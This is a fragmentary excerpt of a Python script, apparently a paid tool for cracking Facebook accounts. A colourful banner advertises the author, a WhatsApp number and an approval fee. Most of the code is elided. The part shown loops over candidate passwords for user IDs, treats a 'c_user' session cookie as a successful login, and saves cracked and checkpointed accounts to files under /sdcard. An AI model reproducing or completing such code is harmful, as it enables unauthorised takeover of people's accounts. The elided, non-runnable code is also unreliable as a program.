...
def main_apv():
    ...
    r1=requests.get("https://github.com/MR-AUH404/aproval.txt/tree/main").text
...
logo="""
             \033[1;93m __       __  _______          ______   __    __  __    __ 
             \033[1;95m|/  \     /  |/       \        /      \ /  |  /  |/  |  /  |
             \033[1;93m| $$  \   /$$ |$$$$$$$  |      /$$$$$$  |$$ |  $$ |$$ |  $$ |
             \033[1;95m| $$$  \ /$$$ |$$ |__$$ |      $$ |__$$ |$$ |  $$ |$$ |__$$ |
             \033[1;93m| $$$$  /$$$$ |$$    $$<       $$    $$ |$$ |  $$ |$$    $$ |
        ...
        \033[1;92m༄AUH•───────────────────────────────────────•༄BRAND
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m▇▇➣    \033[1;95mAUTHOR   : MR AUH   \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGITHUB   : MR-AUH404          \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;93mFACEBOOK : AHSAM UL HAQ      \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;92mWHATSAPP : +923411471937      \033[1;93m▇▇
             \033[1;93m▇▇➣       \033[1;91mTHIS TOOL IS PAID          \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mONLY 100RS FOR APRVAL      \033[1;93m▇▇
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
         \033[1;92m༄AHSAM•───────────────────────────────────────•༄UL HAQ
""" 
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/Auh-OK.txt' % (H, P, str(len(ok))))
 
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/aAuh-CP.txt' % (H, P, str(len(cp))))
...
def R():
			...
			print ("\033[1;93m▇▇➣\033[1;97m❥❥❥❥❥❥❥\033[1;94mAB DAFA HO JAO YAHASE  : MR AHSAM")
			print ('\033[1;92m༄MR•───────────────────────────────────────•༄AUH')
			key = input(" [*] Choose : ")
			print ('༄AHSAM•───────────────────────────────────────•༄JOIYA')
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[Auh]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    open('/sdcard/AUH_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/AUH_CP.txt' , 'a').write('%s\n' % wrt)
